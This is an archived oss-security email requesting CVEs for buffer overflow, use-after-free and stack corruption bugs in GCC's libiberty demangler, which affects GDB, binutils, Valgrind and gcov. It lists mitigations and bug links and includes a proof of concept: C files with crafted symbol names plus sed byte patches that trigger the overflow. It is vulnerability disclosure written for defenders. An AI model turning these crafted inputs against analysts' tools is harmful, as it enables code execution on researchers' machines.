X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3301" "Thursday" "5" "May" "2016" "11:12:10" "+0800" "=?utf-8?B?TWFyY2VsIELDtmhtZQ==?=" "boehme.marcel@gmail.com" "<5716C1F8-38A3-4FEF-A222-AA5BDC3298F1@gmail.com>" "116" "[oss-security] CVE Request: No Demangling During Analysis of Untrusted Binaries" "^Cc:" nil nil "5" "2016050503:12:10" "[oss-security] CVE Request: No Demangling During Analysis of Untrusted Binaries" (number mark "        boehme.marce May  5  116/3301  " thread-indent "\"[oss-security] CVE Request: No Demangling During Analysis of Untrusted Binaries\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 7540 invoked by uid 550); 5 May 2016 03:41:03 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 21597 invoked from network); 5 May 2016 03:12:26 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=from:content-transfer-encoding:subject:date:message-id:cc:to
         :mime-version;
        bh=Zx+H6yBIoZaL05+ltTzTDjROKqnEnc1hlBj1NIVXow0=;
        b=RbbQZFPmbq9tc+/vHpC4N5yHNxuGFvrgP/faD7CIq2Z75X4WV1C7FUIkCj2zxWcSlf
         01+iZBR65+e2URkLswpchFskxBoSOLN/RnRHu8KQeO1PPfvG93eaw+CFb58xxTPPpfJw
         q/HTkbok2JGZDTNdpp70+hqsW5WbYX19A5R5+D4IF1ffM68yFym50AZKON3B7hAZat5q
         idv34pXa97XvLg561v3QwWwdmcnkm1jPV1gtGCCGam0ILsTzphazBtEKXVXsliaiH2Yf
         0bTaQN+U260WxWjWFQMzc0CbEAS/IAC/cdDa/L/MUpXQhRSAkmW8HZSeNWgoJ/Vdp8Hc
         svAQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:from:content-transfer-encoding:subject:date
         :message-id:cc:to:mime-version;
        bh=Zx+H6yBIoZaL05+ltTzTDjROKqnEnc1hlBj1NIVXow0=;
        b=RoLDe9Yu379+YlGI/vOM9x2N1n7w4hPfo2zORdzmrutExHpvGqUYgbM4ybbSxN0Ks9
         lsxi4P+xHmTuGs361VKuWduI1bKtYIEHjlpX930ezjhGMjprMV/RBUhNfgoMoelvADc/
         xrjho2lnG5J3Zme3NNkaxcl9JUKqagbieTiUqHc5mHV8qAcwe+tQUqiYESeSniv6l34U
         oeJqQnSeMdWgwPrOsDkL3xF0+j+iZ5k9VI7WPWQ/4CtbIsgsGWlqY6BtQQvbYadsKJtB
         h+tex1UzNR9MgXK61IiiTt7IRqGcvce8SmI21KAeVsPWCscMu7d70Qfr2fVW7WMZTkmZ
         VtCw==
X-Gm-Message-State: AOPr4FWd9YYgEO7cT11dpmxHf2RkPMXtmv29C77WhD0bBumB8457uKfuNAr0qIH9WNDjZQ==
X-Received: by 10.66.148.2 with SMTP id to2mr17280125pab.72.1462417934324;
        Wed, 04 May 2016 20:12:14 -0700 (PDT)
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable
Message-Id: <5716C1F8-38A3-4FEF-A222-AA5BDC3298F1@gmail.com>
Mime-Version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Cc: Bernd Schmidt <bschmidt@redhat.com>,
 florian@eich-krohm.de,
 nickc@redhat.com
Date: Thu, 5 May 2016 11:12:10 +0800
From: =?utf-8?Q?Marcel_B=C3=B6hme?= <boehme.marcel@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE Request: No Demangling During Analysis of Untrusted Binaries
To: CVE ID Requests <cve-assign@mitre.org>,
 oss-security@lists.openwall.com

Hi all,

Attack Vector 1: Security researchers using binary analysis tools, such as =
Valgrind, GDB, Binutils (e.g., objdump, nm, ..), Gcov, or other LibBFD-base=
d tools on untrusted binaries are vulnerable to arbitrary code execution th=
rough several vulnerabilities in Libiberty, the GNU demangling library main=
tained by GCC. An attacker might modify a program binary such that it execu=
tes malicious code upon *analysis* (e.g., an analysis to identify whether t=
he binary is malicious in the first place).=20

Attack Vector 2: Remote access / DoS via Online IDEs or demangling services.

Workaround: Until the patches propagate to the vulnerable tools, switch off=
 default demangling! E.g.,
$ echo "set demangle-style none"  >>  ~/.gdbinit
$ echo "--demangle=3Dno" >> ~/.valgrindrc

Details and reproducers in the bug reports:

1) Exploitable Buffer Overflow (Fixed in GCC trunk)
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=3D69687

2) Invalid Write due to a Use-After-Free (Fixed in GCC trunk)
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=3D70481

3) Invalid Write due to Integer Overflow (Fixed in GCC trunk)
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=3D70492

4) Write Access Violation (Fixed in GCC trunk)
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=3D70498

5) Various Stack Corruptions (Patch under Review)
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=3D70909
https://gcc.gnu.org/ml/gcc-patches/2016-05/threads.html#00105

6) Write Access Violation (Patch under Review)
https://gcc.gnu.org/bugzilla/show_bug.cgi?id=3D70926
https://gcc.gnu.org/ml/gcc-patches/2016-05/threads.html#00223

These vulnerabilities have been found with a more efficient version of the =
AFL fuzzer.
A recent 12h fuzzing session on the patched version did not reveal any more=
 security critical bugs in the demangling library.

POC for PR69687
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

** GDB and BINUTILS
$ cat comileme.c
#include <stdio.h>
const char *__020A___________________X00020A___R0020A__U000R03000N99999999_=
020A__K000=3D"Hello World";
int main() {
  printf("%s\n",__020A___________________X00020A___R0020A__U000R03000N99999=
999_020A__K000);
}
$ g++ compileme.c -o compileme
$ ./compileme
Hello World!
$ gdb ./compileme
..
$ objdump -x -C ./compileme
..
$ nm -C ./compileme
..

** VALGRIND + GCOV:
$ cat compilemetoo.c
#include<stdio.h>
#include<stdlib.h>

const char* ____________________X00020A___R0020A__U000R03000N99999999_020A_=
_K000(){
  char *p;
  p =3D (char *) malloc(19);
  p =3D (char *) malloc(12);
  free(p);
  p =3D (char *) malloc(16);
  return "Hello World!";
}

int main()
{
   printf("%s\n",____________________X00020A___R0020A__U000R03000N99999999_=
020A__K000());
   return 0;
}

$ g++ compilemetoo.c -o compilemetoo
$ sed -bi s/Z68/_20/g compilemetoo
$ chmod u+x compilemetoo
$ ./compilemetoo
Hello World!
$ valgrind --leak-check=3Dyes ./compilemetoo
..

GCOV:
$ g++ -fprofile-arcs -ftest-coverage compilemetoo.c -o compilemetoo
$ sed -bi s/Z68/_20/g compilemetoo
$ sed -bi s/Z68/_20/g compilemetoo.gcda
$ ./compilemetoo
Hello World!
$ gcov --version
gcov (GCC) 7.0.0
$ gcov -mf compilemetoo
..

Best regards,
- Marcel

---
Marcel B=C3=B6hme
Post-doctoral Research Fellow
TSUNAMi Security Research Center
National University of Singapore

